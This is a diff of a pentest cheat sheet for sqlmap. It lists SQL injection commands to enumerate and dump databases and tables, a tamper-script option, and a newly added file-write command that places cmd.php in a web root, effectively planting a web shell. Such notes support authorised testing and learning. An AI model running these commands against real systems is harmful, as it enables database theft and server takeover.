@@ -21,42 +21,37 @@ sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --ris
 
 ```bash
 # Initial testing HTTPS
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
 ```
 
 ```bash
 # Add a string to indicate injection succeed (e.g. Invalid User vs Error Occurred)
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
 ```
 
 ```bash
 # Get databases
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
 ```
 
 ```bash
 # Get tables
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --tables
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --tables
 ```
 
 ```bash
 # Dump table
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME -T TABLE_NAME --dump
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME -T TABLE_NAME --dump
 ```
 
 ```bash
 # Dump all tables (slow)
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --dump
-```
-
-```bash
-# Add payload tamper script, e.g. randomcase
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D DB_NAME --dump
 ```
 
 ```bash
 # Specify technique
-sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
 ```
 
 #### Technique
@@ -70,6 +65,18 @@ sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --ris
 |T: Time-based blind   |
 |Q: Inline queries     |
 +----------------------+
+```
+
+#### Advance sqlmap
+
+```bash
+# File write
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
+```
+
+```bash
+# Add payload tamper script, e.g. randomcase
+sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
 ```
 
 #### tamper.py template
